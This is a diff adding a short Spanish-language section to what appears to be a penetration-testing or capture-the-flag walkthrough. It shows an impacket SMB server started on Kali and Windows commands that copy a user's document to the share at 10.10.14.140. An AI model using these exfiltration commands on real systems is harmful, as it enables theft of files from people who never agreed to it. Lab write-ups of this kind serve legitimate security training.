@@ -4524,10 +4524,22 @@ uv run python themebleed.py
 
 Para exfiltrar informacion la forma mas facil es usar el protocolo smb en kali.
 
+En Kali
 ```
+impacket-smbserver smbFolder $(pwd) -smb2support
+```
+En windows
 
 ```
+	# Revisa que si exista este folder
 
+dir \\10.10.14.140\smbFolder
+
+	# Ya copia si si existe
+
+copy "C:\Users\sam.emerson\Documents\CVE-2023-28252_Summary.pdf" \\10.10.14.140\smbFolder\
+
+```
 
 # Referencias
 
